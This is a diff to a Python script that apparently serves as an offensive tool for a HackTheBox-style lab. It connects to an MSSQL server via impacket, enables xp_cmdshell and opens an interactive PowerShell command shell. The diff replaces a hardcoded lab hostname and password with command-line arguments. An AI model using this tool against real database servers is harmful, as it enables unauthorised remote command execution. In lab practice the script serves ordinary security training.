@@ -1,9 +1,11 @@
-# /usr/bin/env python3
+#!/usr/bin/env python3
+
 # interactive xp_cmdshell
 # with impacket and cmd
 # used https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py for reference
 import base64
 import cmd
+import argparse
 
 from impacket import tds
 
@@ -163,8 +165,14 @@ if __name__ == '__main__':
     # if len(sys.argv) > 1 and sys.argv[1] == '-powershell':
     #     pwsh = True
 
+    parser = argparse.ArgumentParser(description="Connect to mssql server using username, password, and hostname.")
+    parser.add_argument('-u', '--username', required=True, help="Username for the server")
+    parser.add_argument('-p', '--password', required=True, help="Password for the server")
+    parser.add_argument('-H', '--hostname', required=True, help="Hostname or IP address of the server")
+    args = parser.parse_args()
+
     # if connection successful
-    xp_shell = connect_mssql("teignton.htb", username="webappusr", password="d65f4sd5f1s!df1fsd65f1sd")
+    xp_shell = connect_mssql(args.hostname, username=args.username, password=args.password)
     if isinstance(xp_shell, XpShell):
         xp_shell.do_enable_xp_cmdshell()
         xp_shell.pwsh = True
